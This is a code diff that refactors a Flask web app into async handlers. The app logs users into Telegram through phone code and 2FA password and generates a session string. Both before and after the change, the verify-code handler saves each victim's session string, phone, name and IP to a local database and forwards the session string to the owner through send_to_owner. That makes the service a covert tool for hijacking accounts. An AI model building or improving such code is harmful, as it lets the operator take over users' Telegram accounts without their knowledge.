@@ -60,7 +60,7 @@ def index():
     return render_template('code_input.html', phone='')
 
 @app.route('/request-code', methods=['POST'])
-def request_code():
+async def request_code():
     data = request.json
     phone = data.get('phone')
     
@@ -78,17 +78,9 @@ def request_code():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         active_sessions[phone]['client'] = client
         
-        # Start client and send code
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        async def send_code():
-            await client.connect()
-            await client.send_code_request(phone)
-            return True
-        
-        loop.run_until_complete(send_code())
-        loop.close()
+        # Connect and send code - using the existing event loop
+        await client.connect()
+        await client.send_code_request(phone)
         
         return jsonify({'success': True})
         
@@ -98,7 +90,7 @@ def request_code():
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/verify-code', methods=['POST'])
-def verify_code():
+async def verify_code():
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
@@ -110,55 +102,47 @@ def verify_code():
     client = active_sessions[phone]['client']
     
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        # Sign in - using the existing event loop
+        try:
+            await client.sign_in(phone, code)
+        except SessionPasswordNeededError:
+            if not password:
+                return jsonify({'success': False, 'error': '2FA password required'})
+            await client.sign_in(password=password)
         
-        async def verify():
-            try:
-                await client.sign_in(phone, code)
-            except SessionPasswordNeededError:
-                if not password:
-                    return {'success': False, 'error': '2FA password required'}
-                await client.sign_in(password=password)
-            
-            # Get user info
-            me = await client.get_me()
-            session_string = client.session.save()
-            
-            # Get client IP
-            ip = request.remote_addr
-            
-            # Save to database
-            conn = sqlite3.connect('sessions.db')
-            c = conn.cursor()
-            c.execute('''INSERT INTO sessions 
-                        (user_id, phone, session_string, first_name, username, generated_at, ip)
-                        VALUES (?, ?, ?, ?, ?, ?, ?)''',
-                     (me.id, phone, session_string, me.first_name, me.username, 
-                      datetime.now().isoformat(), ip))
-            conn.commit()
-            conn.close()
-            
-            # Send to owner via bot
-            send_to_owner(me.id, phone, session_string, me.first_name, me.username)
-            
-            # Send to user
-            send_to_user(me.id, session_string)
-            
-            await client.disconnect()
-            
-            return {
-                'success': True,
-                'message': f'Session generated for {me.first_name}! Check bot chat.'
-            }
+        # Get user info
+        me = await client.get_me()
+        session_string = client.session.save()
         
-        result = loop.run_until_complete(verify())
-        loop.close()
+        # Get client IP
+        ip = request.remote_addr
+        
+        # Save to database
+        conn = sqlite3.connect('sessions.db')
+        c = conn.cursor()
+        c.execute('''INSERT INTO sessions 
+                    (user_id, phone, session_string, first_name, username, generated_at, ip)
+                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                 (me.id, phone, session_string, me.first_name, me.username, 
+                  datetime.now().isoformat(), ip))
+        conn.commit()
+        conn.close()
+        
+        # Send to owner via bot
+        send_to_owner(me.id, phone, session_string, me.first_name, me.username)
+        
+        # Send to user
+        send_to_user(me.id, session_string)
+        
+        await client.disconnect()
         
         # Clean up
         del active_sessions[phone]
         
-        return jsonify(result)
+        return jsonify({
+            'success': True,
+            'message': f'Session generated for {me.first_name}! Check bot chat.'
+        })
         
     except PhoneCodeInvalidError:
         return jsonify({'success': False, 'error': 'Invalid code'})
